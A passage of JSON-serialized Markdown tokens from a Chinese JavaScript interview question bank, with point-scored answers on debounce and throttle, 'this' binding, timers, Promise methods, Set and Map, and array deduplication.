防抖：在事件被触发后，延迟一定时间后再执行回调函数，如果在延迟时间内再次触发事件，则重新计算延迟时间，直到延迟时间结束后才执行回调函数。例如，在用户输入搜索框时，防止频繁发送请求，可以使用防抖函数，只有在用户停止输入一段时间后才发送搜索请求。\\n","task":false,"loose":false,"text":"**1：** 防抖：在事件被触发后，延迟一定时间后再执行回调函数，如果在延迟时间内再次触发事件，则重新计算延迟时间，直到延迟时间结束后才执行回调函数。例如，在用户输入搜索框时，防止频繁发送请求，可以使用防抖函数，只有在用户停止输入一段时间后才发送搜索请求。","tokens":[{"type":"text","raw":"**1：** 防抖：在事件被触发后，延迟一定时间后再执行回调函数，如果在延迟时间内再次触发事件，则重新计算延迟时间，直到延迟时间结束后才执行回调函数。例如，在用户输入搜索框时，防止频繁发送请求，可以使用防抖函数，只有在用户停止输入一段时间后才发送搜索请求。","text":"**1：** 防抖：在事件被触发后，延迟一定时间后再执行回调函数，如果在延迟时间内再次触发事件，则重新计算延迟时间，直到延迟时间结束后才执行回调函数。例如，在用户输入搜索框时，防止频繁发送请求，可以使用防抖函数，只有在用户停止输入一段时间后才发送搜索请求。","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" 防抖：在事件被触发后，延迟一定时间后再执行回调函数，如果在延迟时间内再次触发事件，则重新计算延迟时间，直到延迟时间结束后才执行回调函数。例如，在用户输入搜索框时，防止频繁发送请求，可以使用防抖函数，只有在用户停止输入一段时间后才发送搜索请求。","text":" 防抖：在事件被触发后，延迟一定时间后再执行回调函数，如果在延迟时间内再次触发事件，则重新计算延迟时间，直到延迟时间结束后才执行回调函数。例如，在用户输入搜索框时，防止频繁发送请求，可以使用防抖函数，只有在用户停止输入一段时间后才发送搜索请求。","escaped":false}]}]},{"type":"list_item","raw":"- **2：** 节流：在一定时间内，只允许函数执行一次。例如，在页面滚动时，需要频繁执行某个函数来处理滚动事件，但为了避免函数执行过于频繁影响性能，可以使用节流函数，限制函数在一定时间内只执行一次。","task":false,"loose":false,"text":"**2：** 节流：在一定时间内，只允许函数执行一次。例如，在页面滚动时，需要频繁执行某个函数来处理滚动事件，但为了避免函数执行过于频繁影响性能，可以使用节流函数，限制函数在一定时间内只执行一次。","tokens":[{"type":"text","raw":"**2：** 节流：在一定时间内，只允许函数执行一次。例如，在页面滚动时，需要频繁执行某个函数来处理滚动事件，但为了避免函数执行过于频繁影响性能，可以使用节流函数，限制函数在一定时间内只执行一次。","text":"**2：** 节流：在一定时间内，只允许函数执行一次。例如，在页面滚动时，需要频繁执行某个函数来处理滚动事件，但为了避免函数执行过于频繁影响性能，可以使用节流函数，限制函数在一定时间内只执行一次。","tokens":[{"type":"strong","raw":"**2：**","text":"2：","tokens":[{"type":"text","raw":"2：","text":"2：","escaped":false}]},{"type":"text","raw":" 节流：在一定时间内，只允许函数执行一次。例如，在页面滚动时，需要频繁执行某个函数来处理滚动事件，但为了避免函数执行过于频繁影响性能，可以使用节流函数，限制函数在一定时间内只执行一次。","text":" 节流：在一定时间内，只允许函数执行一次。例如，在页面滚动时，需要频繁执行某个函数来处理滚动事件，但为了避免函数执行过于频繁影响性能，可以使用节流函数，限制函数在一定时间内只执行一次。","escaped":false}]}]}]},{"type":"space","raw":"\\n\\n"},{"type":"heading","raw":"## JS 请解释在 JavaScript 中this指针的工作原理，在以下函数调用场景中this指向什么？\\n\\n","depth":2,"text":"JS 请解释在 JavaScript 中this指针的工作原理，在以下函数调用场景中this指向什么？","tokens":[{"type":"text","raw":"JS 请解释在 JavaScript 中this指针的工作原理，在以下函数调用场景中this指向什么？","text":"JS 请解释在 JavaScript 中this指针的工作原理，在以下函数调用场景中this指向什么？","escaped":false}]},{"type":"heading","raw":"#### 类型：`基础`\\n\\n","depth":4,"text":"类型：`基础`","tokens":[{"type":"text","raw":"类型：","text":"类型：","escaped":false},{"type":"codespan","raw":"`基础`","text":"基础"}]},{"type":"heading","raw":"#### 级别：`W1`\\n\\n","depth":4,"text":"级别：`W1`","tokens":[{"type":"text","raw":"级别：","text":"级别：","escaped":false},{"type":"codespan","raw":"`W1`","text":"W1"}]},{"type":"code","raw":"```js\\nconst person = {\\n    name: \\"张三\\",\\n    sayHello: function() {\\n        console.log(`你好，我的名字叫 ${this.name}`);\\n    }\\n};\\nperson.sayHello();\\n```","lang":"js","text":"const person = {\\n    name: \\"张三\\",\\n    sayHello: function() {\\n        console.log(`你好，我的名字叫 ${this.name}`);\\n    }\\n};\\nperson.sayHello();"},{"type":"space","raw":"\\n\\n"},{"type":"heading","raw":"#### 解答（2 分）\\n\\n","depth":4,"text":"解答（2 分）","tokens":[{"type":"text","raw":"解答（2 分）","text":"解答（2 分）","escaped":false}]},{"type":"list","raw":"- **1：** 在person.sayHello()调用中，this指向person对象。\\n- **1：** 当一个函数作为对象的方法被调用时，this指向调用该方法的对象。在这里，sayHello是person对象的方法，所以this指代person，因此可以正确访问person.name","ordered":false,"start":"","loose":false,"items":[{"type":"list_item","raw":"- **1：** 在person.sayHello()调用中，this指向person对象。\\n","task":false,"loose":false,"text":"**1：** 在person.sayHello()调用中，this指向person对象。","tokens":[{"type":"text","raw":"**1：** 在person.sayHello()调用中，this指向person对象。","text":"**1：** 在person.sayHello()调用中，this指向person对象。","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" 在person.sayHello()调用中，this指向person对象。","text":" 在person.sayHello()调用中，this指向person对象。","escaped":false}]}]},{"type":"list_item","raw":"- **1：** 当一个函数作为对象的方法被调用时，this指向调用该方法的对象。在这里，sayHello是person对象的方法，所以this指代person，因此可以正确访问person.name","task":false,"loose":false,"text":"**1：** 当一个函数作为对象的方法被调用时，this指向调用该方法的对象。在这里，sayHello是person对象的方法，所以this指代person，因此可以正确访问person.name","tokens":[{"type":"text","raw":"**1：** 当一个函数作为对象的方法被调用时，this指向调用该方法的对象。在这里，sayHello是person对象的方法，所以this指代person，因此可以正确访问person.name","text":"**1：** 当一个函数作为对象的方法被调用时，this指向调用该方法的对象。在这里，sayHello是person对象的方法，所以this指代person，因此可以正确访问person.name","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" 当一个函数作为对象的方法被调用时，this指向调用该方法的对象。在这里，sayHello是person对象的方法，所以this指代person，因此可以正确访问person.name","text":" 当一个函数作为对象的方法被调用时，this指向调用该方法的对象。在这里，sayHello是person对象的方法，所以this指代person，因此可以正确访问person.name","escaped":false}]}]}]},{"type":"space","raw":"\\n\\n"},{"type":"heading","raw":"## JS 请解释setTimeout和setInterval的区别，并说明如何清除定时器\\n\\n","depth":2,"text":"JS 请解释setTimeout和setInterval的区别，并说明如何清除定时器","tokens":[{"type":"text","raw":"JS 请解释setTimeout和setInterval的区别，并说明如何清除定时器","text":"JS 请解释setTimeout和setInterval的区别，并说明如何清除定时器","escaped":false}]},{"type":"heading","raw":"#### 类型：`基础`\\n\\n","depth":4,"text":"类型：`基础`","tokens":[{"type":"text","raw":"类型：","text":"类型：","escaped":false},{"type":"codespan","raw":"`基础`","text":"基础"}]},{"type":"heading","raw":"#### 级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`\\n\\n","depth":4,"text":"级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`","tokens":[{"type":"text","raw":"级别：","text":"级别：","escaped":false},{"type":"codespan","raw":"`W1`","text":"W1"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W2`","text":"W2"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W3`","text":"W3"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W4`","text":"W4"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W5`","text":"W5"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W6`","text":"W6"}]},{"type":"heading","raw":"#### 解答（2 分）\\n\\n","depth":4,"text":"解答（2 分）","tokens":[{"type":"text","raw":"解答（2 分）","text":"解答（2 分）","escaped":false}]},{"type":"list","raw":"- **1：** setTimeout：在指定的延迟时间（毫秒）后执行一次回调函数。示例：setTimeout(() => console.log(\'Delayed\'), 1000);，1 秒后会执行一次回调打印Delayed。\\nsetInterval：按照指定的时间间隔（毫秒）重复执行回调函数。示例：let intervalId = setInterval(() => console.log(\'Repeating\'), 1000);，每隔 1 秒就会执行一次回调打印Repeating。\\n- **1：** 使用clearTimeout清除setTimeout创建的定时器，传入setTimeout返回的定时器 ID。例如：const timeoutId = setTimeout(() => console.log(\'Timeout\'), 2000); clearTimeout(timeoutId);，这样就会取消即将执行的setTimeout回调。\\n          使用clearInterval清除setInterval创建的定时器，传入setInterval返回的定时器 ID，如clearInterval(intervalId);会停止setInterval的重复执行。","ordered":false,"start":"","loose":false,"items":[{"type":"list_item","raw":"- **1：** setTimeout：在指定的延迟时间（毫秒）后执行一次回调函数。示例：setTimeout(() => console.log(\'Delayed\'), 1000);，1 秒后会执行一次回调打印Delayed。\\nsetInterval：按照指定的时间间隔（毫秒）重复执行回调函数。示例：let intervalId = setInterval(() => console.log(\'Repeating\'), 1000);，每隔 1 秒就会执行一次回调打印Repeating。\\n","task":false,"loose":false,"text":"**1：** setTimeout：在指定的延迟时间（毫秒）后执行一次回调函数。示例：setTimeout(() => console.log(\'Delayed\'), 1000);，1 秒后会执行一次回调打印Delayed。\\nsetInterval：按照指定的时间间隔（毫秒）重复执行回调函数。示例：let intervalId = setInterval(() => console.log(\'Repeating\'), 1000);，每隔 1 秒就会执行一次回调打印Repeating。","tokens":[{"type":"text","raw":"**1：** setTimeout：在指定的延迟时间（毫秒）后执行一次回调函数。示例：setTimeout(() => console.log(\'Delayed\'), 1000);，1 秒后会执行一次回调打印Delayed。\\n\\nsetInterval：按照指定的时间间隔（毫秒）重复执行回调函数。示例：let intervalId = setInterval(() => console.log(\'Repeating\'), 1000);，每隔 1 秒就会执行一次回调打印Repeating。","text":"**1：** setTimeout：在指定的延迟时间（毫秒）后执行一次回调函数。示例：setTimeout(() => console.log(\'Delayed\'), 1000);，1 秒后会执行一次回调打印Delayed。\\nsetInterval：按照指定的时间间隔（毫秒）重复执行回调函数。示例：let intervalId = setInterval(() => console.log(\'Repeating\'), 1000);，每隔 1 秒就会执行一次回调打印Repeating。","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" setTimeout：在指定的延迟时间（毫秒）后执行一次回调函数。示例：setTimeout(() => console.log(\'Delayed\'), 1000);，1 秒后会执行一次回调打印Delayed。\\nsetInterval：按照指定的时间间隔（毫秒）重复执行回调函数。示例：let intervalId = setInterval(() => console.log(\'Repeating\'), 1000);，每隔 1 秒就会执行一次回调打印Repeating。","text":" setTimeout：在指定的延迟时间（毫秒）后执行一次回调函数。示例：setTimeout(() => console.log(\'Delayed\'), 1000);，1 秒后会执行一次回调打印Delayed。\\nsetInterval：按照指定的时间间隔（毫秒）重复执行回调函数。示例：let intervalId = setInterval(() => console.log(\'Repeating\'), 1000);，每隔 1 秒就会执行一次回调打印Repeating。","escaped":false}]}]},{"type":"list_item","raw":"- **1：** 使用clearTimeout清除setTimeout创建的定时器，传入setTimeout返回的定时器 ID。例如：const timeoutId = setTimeout(() => console.log(\'Timeout\'), 2000); clearTimeout(timeoutId);，这样就会取消即将执行的setTimeout回调。\\n          使用clearInterval清除setInterval创建的定时器，传入setInterval返回的定时器 ID，如clearInterval(intervalId);会停止setInterval的重复执行。","task":false,"loose":false,"text":"**1：** 使用clearTimeout清除setTimeout创建的定时器，传入setTimeout返回的定时器 ID。例如：const timeoutId = setTimeout(() => console.log(\'Timeout\'), 2000); clearTimeout(timeoutId);，这样就会取消即将执行的setTimeout回调。\\n        使用clearInterval清除setInterval创建的定时器，传入setInterval返回的定时器 ID，如clearInterval(intervalId);会停止setInterval的重复执行。","tokens":[{"type":"text","raw":"**1：** 使用clearTimeout清除setTimeout创建的定时器，传入setTimeout返回的定时器 ID。例如：const timeoutId = setTimeout(() => console.log(\'Timeout\'), 2000); clearTimeout(timeoutId);，这样就会取消即将执行的setTimeout回调。\\n\\n        使用clearInterval清除setInterval创建的定时器，传入setInterval返回的定时器 ID，如clearInterval(intervalId);会停止setInterval的重复执行。","text":"**1：** 使用clearTimeout清除setTimeout创建的定时器，传入setTimeout返回的定时器 ID。例如：const timeoutId = setTimeout(() => console.log(\'Timeout\'), 2000); clearTimeout(timeoutId);，这样就会取消即将执行的setTimeout回调。\\n    使用clearInterval清除setInterval创建的定时器，传入setInterval返回的定时器 ID，如clearInterval(intervalId);会停止setInterval的重复执行。","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" 使用clearTimeout清除setTimeout创建的定时器，传入setTimeout返回的定时器 ID。例如：const timeoutId = setTimeout(() => console.log(\'Timeout\'), 2000); clearTimeout(timeoutId);，这样就会取消即将执行的setTimeout回调。\\n    使用clearInterval清除setInterval创建的定时器，传入setInterval返回的定时器 ID，如clearInterval(intervalId);会停止setInterval的重复执行。","text":" 使用clearTimeout清除setTimeout创建的定时器，传入setTimeout返回的定时器 ID。例如：const timeoutId = setTimeout(() => console.log(\'Timeout\'), 2000); clearTimeout(timeoutId);，这样就会取消即将执行的setTimeout回调。\\n    使用clearInterval清除setInterval创建的定时器，传入setInterval返回的定时器 ID，如clearInterval(intervalId);会停止setInterval的重复执行。","escaped":false}]}]}]},{"type":"space","raw":"\\n\\n"},{"type":"heading","raw":"## Promise 的常用方法\\n\\n","depth":2,"text":"Promise 的常用方法","tokens":[{"type":"text","raw":"Promise 的常用方法","text":"Promise 的常用方法","escaped":false}]},{"type":"heading","raw":"#### 类型：`基础`\\n\\n","depth":4,"text":"类型：`基础`","tokens":[{"type":"text","raw":"类型：","text":"类型：","escaped":false},{"type":"codespan","raw":"`基础`","text":"基础"}]},{"type":"heading","raw":"#### 级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`\\n\\n","depth":4,"text":"级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`","tokens":[{"type":"text","raw":"级别：","text":"级别：","escaped":false},{"type":"codespan","raw":"`W1`","text":"W1"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W2`","text":"W2"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W3`","text":"W3"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W4`","text":"W4"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W5`","text":"W5"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W6`","text":"W6"}]},{"type":"heading","raw":"#### 解答（7 分）\\n\\n","depth":4,"text":"解答（7 分）","tokens":[{"type":"text","raw":"解答（7 分）","text":"解答（7 分）","escaped":false}]},{"type":"list","raw":"- **1：** Promise.resolve(value)：返回一个已解决的 Promise，如果 value 是一个 Promise，返回的 Promise 会继承其状态。\\n- **1：** Promise.reject(reason)：返回一个已拒绝的 Promise，带有拒绝的原因。\\n- **1：** Promise.all(iterable)：接收一个可迭代对象，返回一个新的 Promise，当所有 Promise 都成功时返回结果数组，若有任何 Promise 失败，返回的 Promise 会立即失败。\\n- **1：** Promise.race(iterable)：返回一个 Promise，它会在第一个完成的 Promise 状态改变时返回该 Promise 的结果（无论是成功还是失败）。\\n- **1：** Promise.allSettled(iterable)：返回一个新的 Promise，在所有输入的 Promise 完成时返回，结果包含每个 Promise 的状态及其结果。\\n- **1：** Promise.any(iterable)：返回一个新的 Promise，它会在第一个成功的 Promise 完成时返回成功结果，如果所有的 Promise 都失败，则返回一个拒绝的 Promise。\\n- **1：** Promise.finally(onFinally)：无论 Promise 成功或失败，都会执行 onFinally 回调，常用于清理操作。","ordered":false,"start":"","loose":false,"items":[{"type":"list_item","raw":"- **1：** Promise.resolve(value)：返回一个已解决的 Promise，如果 value 是一个 Promise，返回的 Promise 会继承其状态。\\n","task":false,"loose":false,"text":"**1：** Promise.resolve(value)：返回一个已解决的 Promise，如果 value 是一个 Promise，返回的 Promise 会继承其状态。","tokens":[{"type":"text","raw":"**1：** Promise.resolve(value)：返回一个已解决的 Promise，如果 value 是一个 Promise，返回的 Promise 会继承其状态。","text":"**1：** Promise.resolve(value)：返回一个已解决的 Promise，如果 value 是一个 Promise，返回的 Promise 会继承其状态。","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" Promise.resolve(value)：返回一个已解决的 Promise，如果 value 是一个 Promise，返回的 Promise 会继承其状态。","text":" Promise.resolve(value)：返回一个已解决的 Promise，如果 value 是一个 Promise，返回的 Promise 会继承其状态。","escaped":false}]}]},{"type":"list_item","raw":"- **1：** Promise.reject(reason)：返回一个已拒绝的 Promise，带有拒绝的原因。\\n","task":false,"loose":false,"text":"**1：** Promise.reject(reason)：返回一个已拒绝的 Promise，带有拒绝的原因。","tokens":[{"type":"text","raw":"**1：** Promise.reject(reason)：返回一个已拒绝的 Promise，带有拒绝的原因。","text":"**1：** Promise.reject(reason)：返回一个已拒绝的 Promise，带有拒绝的原因。","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" Promise.reject(reason)：返回一个已拒绝的 Promise，带有拒绝的原因。","text":" Promise.reject(reason)：返回一个已拒绝的 Promise，带有拒绝的原因。","escaped":false}]}]},{"type":"list_item","raw":"- **1：** Promise.all(iterable)：接收一个可迭代对象，返回一个新的 Promise，当所有 Promise 都成功时返回结果数组，若有任何 Promise 失败，返回的 Promise 会立即失败。\\n","task":false,"loose":false,"text":"**1：** Promise.all(iterable)：接收一个可迭代对象，返回一个新的 Promise，当所有 Promise 都成功时返回结果数组，若有任何 Promise 失败，返回的 Promise 会立即失败。","tokens":[{"type":"text","raw":"**1：** Promise.all(iterable)：接收一个可迭代对象，返回一个新的 Promise，当所有 Promise 都成功时返回结果数组，若有任何 Promise 失败，返回的 Promise 会立即失败。","text":"**1：** Promise.all(iterable)：接收一个可迭代对象，返回一个新的 Promise，当所有 Promise 都成功时返回结果数组，若有任何 Promise 失败，返回的 Promise 会立即失败。","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" Promise.all(iterable)：接收一个可迭代对象，返回一个新的 Promise，当所有 Promise 都成功时返回结果数组，若有任何 Promise 失败，返回的 Promise 会立即失败。","text":" Promise.all(iterable)：接收一个可迭代对象，返回一个新的 Promise，当所有 Promise 都成功时返回结果数组，若有任何 Promise 失败，返回的 Promise 会立即失败。","escaped":false}]}]},{"type":"list_item","raw":"- **1：** Promise.race(iterable)：返回一个 Promise，它会在第一个完成的 Promise 状态改变时返回该 Promise 的结果（无论是成功还是失败）。\\n","task":false,"loose":false,"text":"**1：** Promise.race(iterable)：返回一个 Promise，它会在第一个完成的 Promise 状态改变时返回该 Promise 的结果（无论是成功还是失败）。","tokens":[{"type":"text","raw":"**1：** Promise.race(iterable)：返回一个 Promise，它会在第一个完成的 Promise 状态改变时返回该 Promise 的结果（无论是成功还是失败）。","text":"**1：** Promise.race(iterable)：返回一个 Promise，它会在第一个完成的 Promise 状态改变时返回该 Promise 的结果（无论是成功还是失败）。","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" Promise.race(iterable)：返回一个 Promise，它会在第一个完成的 Promise 状态改变时返回该 Promise 的结果（无论是成功还是失败）。","text":" Promise.race(iterable)：返回一个 Promise，它会在第一个完成的 Promise 状态改变时返回该 Promise 的结果（无论是成功还是失败）。","escaped":false}]}]},{"type":"list_item","raw":"- **1：** Promise.allSettled(iterable)：返回一个新的 Promise，在所有输入的 Promise 完成时返回，结果包含每个 Promise 的状态及其结果。\\n","task":false,"loose":false,"text":"**1：** Promise.allSettled(iterable)：返回一个新的 Promise，在所有输入的 Promise 完成时返回，结果包含每个 Promise 的状态及其结果。","tokens":[{"type":"text","raw":"**1：** Promise.allSettled(iterable)：返回一个新的 Promise，在所有输入的 Promise 完成时返回，结果包含每个 Promise 的状态及其结果。","text":"**1：** Promise.allSettled(iterable)：返回一个新的 Promise，在所有输入的 Promise 完成时返回，结果包含每个 Promise 的状态及其结果。","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" Promise.allSettled(iterable)：返回一个新的 Promise，在所有输入的 Promise 完成时返回，结果包含每个 Promise 的状态及其结果。","text":" Promise.allSettled(iterable)：返回一个新的 Promise，在所有输入的 Promise 完成时返回，结果包含每个 Promise 的状态及其结果。","escaped":false}]}]},{"type":"list_item","raw":"- **1：** Promise.any(iterable)：返回一个新的 Promise，它会在第一个成功的 Promise 完成时返回成功结果，如果所有的 Promise 都失败，则返回一个拒绝的 Promise。\\n","task":false,"loose":false,"text":"**1：** Promise.any(iterable)：返回一个新的 Promise，它会在第一个成功的 Promise 完成时返回成功结果，如果所有的 Promise 都失败，则返回一个拒绝的 Promise。","tokens":[{"type":"text","raw":"**1：** Promise.any(iterable)：返回一个新的 Promise，它会在第一个成功的 Promise 完成时返回成功结果，如果所有的 Promise 都失败，则返回一个拒绝的 Promise。","text":"**1：** Promise.any(iterable)：返回一个新的 Promise，它会在第一个成功的 Promise 完成时返回成功结果，如果所有的 Promise 都失败，则返回一个拒绝的 Promise。","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" Promise.any(iterable)：返回一个新的 Promise，它会在第一个成功的 Promise 完成时返回成功结果，如果所有的 Promise 都失败，则返回一个拒绝的 Promise。","text":" Promise.any(iterable)：返回一个新的 Promise，它会在第一个成功的 Promise 完成时返回成功结果，如果所有的 Promise 都失败，则返回一个拒绝的 Promise。","escaped":false}]}]},{"type":"list_item","raw":"- **1：** Promise.finally(onFinally)：无论 Promise 成功或失败，都会执行 onFinally 回调，常用于清理操作。","task":false,"loose":false,"text":"**1：** Promise.finally(onFinally)：无论 Promise 成功或失败，都会执行 onFinally 回调，常用于清理操作。","tokens":[{"type":"text","raw":"**1：** Promise.finally(onFinally)：无论 Promise 成功或失败，都会执行 onFinally 回调，常用于清理操作。","text":"**1：** Promise.finally(onFinally)：无论 Promise 成功或失败，都会执行 onFinally 回调，常用于清理操作。","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" Promise.finally(onFinally)：无论 Promise 成功或失败，都会执行 onFinally 回调，常用于清理操作。","text":" Promise.finally(onFinally)：无论 Promise 成功或失败，都会执行 onFinally 回调，常用于清理操作。","escaped":false}]}]}]},{"type":"space","raw":"\\n\\n"},{"type":"heading","raw":"## 解释 Set 和 Map 的使用及区别\\n\\n","depth":2,"text":"解释 Set 和 Map 的使用及区别","tokens":[{"type":"text","raw":"解释 Set 和 Map 的使用及区别","text":"解释 Set 和 Map 的使用及区别","escaped":false}]},{"type":"heading","raw":"#### 类型：基础\\n\\n","depth":4,"text":"类型：基础","tokens":[{"type":"text","raw":"类型：基础","text":"类型：基础","escaped":false}]},{"type":"heading","raw":"#### 级别：W5\\n\\n","depth":4,"text":"级别：W5","tokens":[{"type":"text","raw":"级别：W5","text":"级别：W5","escaped":false}]},{"type":"heading","raw":"#### 解答（2 分）\\n\\n","depth":4,"text":"解答（2 分）","tokens":[{"type":"text","raw":"解答（2 分）","text":"解答（2 分）","escaped":false}]},{"type":"list","raw":"- **1：** Set：是一个集合，用于存储不重复的值，按照插入顺序排列。\\n- **1：** Map：是一个键值对集合，用于存储键值对，可以存储任何类型的键和值。","ordered":false,"start":"","loose":false,"items":[{"type":"list_item","raw":"- **1：** Set：是一个集合，用于存储不重复的值，按照插入顺序排列。\\n","task":false,"loose":false,"text":"**1：** Set：是一个集合，用于存储不重复的值，按照插入顺序排列。","tokens":[{"type":"text","raw":"**1：** Set：是一个集合，用于存储不重复的值，按照插入顺序排列。","text":"**1：** Set：是一个集合，用于存储不重复的值，按照插入顺序排列。","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" Set：是一个集合，用于存储不重复的值，按照插入顺序排列。","text":" Set：是一个集合，用于存储不重复的值，按照插入顺序排列。","escaped":false}]}]},{"type":"list_item","raw":"- **1：** Map：是一个键值对集合，用于存储键值对，可以存储任何类型的键和值。","task":false,"loose":false,"text":"**1：** Map：是一个键值对集合，用于存储键值对，可以存储任何类型的键和值。","tokens":[{"type":"text","raw":"**1：** Map：是一个键值对集合，用于存储键值对，可以存储任何类型的键和值。","text":"**1：** Map：是一个键值对集合，用于存储键值对，可以存储任何类型的键和值。","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" Map：是一个键值对集合，用于存储键值对，可以存储任何类型的键和值。","text":" Map：是一个键值对集合，用于存储键值对，可以存储任何类型的键和值。","escaped":false}]}]}]},{"type":"space","raw":"\\n\\n"},{"type":"code","raw":"```js\\n// Set\\nlet set = new Set();\\nset.add(1);\\nset.add(2);\\nset.add(2); // 会被忽略\\nconsole.log(set); // Set { 1, 2 }\\n\\n// Map\\nlet map = new Map();\\nmap.set(\'name\', \'Alice\');\\nmap.set(\'age\', 25);\\nconsole.log(map.get(\'name\')); // Alice\\n\\n```","lang":"js","text":"// Set\\nlet set = new Set();\\nset.add(1);\\nset.add(2);\\nset.add(2); // 会被忽略\\nconsole.log(set); // Set { 1, 2 }\\n\\n// Map\\nlet map = new Map();\\nmap.set(\'name\', \'Alice\');\\nmap.set(\'age\', 25);\\nconsole.log(map.get(\'name\')); // Alice\\n"},{"type":"space","raw":"\\n\\n"},{"type":"heading","raw":"## 请写出几个 JavaScript 函数，用于实现数组去重\\n\\n","depth":2,"text":"请写出几个 JavaScript 函数，用于实现数组去重","tokens":[{"type":"text","raw":"请写出几个 JavaScript 函数，用于实现数组去重","text":"请写出几个 JavaScript 函数，用于实现数组去重","escaped":false}]},{"type":"heading","raw":"#### 类型：`基础`\\n\\n","depth":4,"text":"类型：`基础`","tokens":[{"type":"text","raw":"类型：","text":"类型：","escaped":false},{"type":"codespan","raw":"`基础`","text":"基础"}]},{"type":"heading","raw":"#### 级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`\\n\\n","depth":4,"text":"级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`","tokens":[{"type":"text","raw":"级别：","text":"级别：","escaped":false},{"type":"codespan","raw":"`W1`","text":"W1"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W2`","text":"W2"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W3`","text":"W3"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W4`","text":"W4"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W5`","text":"W5"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W6`","text":"W6"}]},{"type":"heading","raw":"#### 解答（8 分）\\n\\n","depth":4,"text":"解答（8 分）","tokens":[{"type":"text","raw":"解答（8 分）","text":"解答（8 分）","escaped":false}]},{"type":"html","block":true,"raw":"<details>\\n\\n","pre":false,"text":"<details>\\n\\n"},{"type":"list","raw":"- **1：** 方法一：使用Set对象（ES6 及以上）","ordered":false,"start":"","loose":false,"items":[{"type":"list_item","raw":"- **1：** 方法一：使用Set对象（ES6 及以上）","task":false,"loose":false,"text":"**1：** 方法一：使用Set对象（ES6 及以上）","tokens":[{"type":"text","raw":"**1：** 方法一：使用Set对象（ES6 及以上）","text":"**1：** 方法一：使用Set对象（ES6 及以上）","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" 方法一：使用Set对象（ES6 及以上）","text":" 方法一：使用Set对象（ES6 及以上）","escaped":false}]}]}]},{"type":"space","raw":"\\n\\n"},{"type":"code","raw":"```js\\n//原理：Set是一种新的数据结构，它类似于数组，但是成员的值都是唯一的。可以将数组转换为Set，然后再转换回数组来实现去重。\\nfunction uniqueArray(arr) {\\n    return [...new Set(arr)];\\n}\\nlet array = [1, 2, 2, 3, 4, 4];\\nconsole.log(uniqueArray(array)); // 输出[1, 2, 3, 4]\\n//解释：new Set(array)会创建一个Set对象，其中包含了array中的所有元素，并且自动去重。然后，通过扩展运算符...将Set对象转换回数组，得到去重后的结果。\\n```","lang":"js","text":"//原理：Set是一种新的数据结构，它类似于数组，但是成员的值都是唯一的。可以将数组转换为Set，然后再转换回数组来实现去重。\\nfunction uniqueArray(arr) {\\n    return [...new Set(arr)];\\n}\\nlet array = [1, 2, 2, 3, 4, 4];\\nconsole.log(uniqueArray(array)); // 输出[1, 2, 3, 4]\\n//解释：new Set(array)会创建一个Set对象，其中包含了array中的所有元素，并且自动去重。然后，通过扩展运算符...将Set对象转换回数组，得到去重后的结果。"},{"type":"space","raw":"\\n\\n"},{"type":"list","raw":"- **1：** 方法二：使用循环和一个新数组","ordered":false,"start":"","loose":false,"items":[{"type":"list_item","raw":"- **1：** 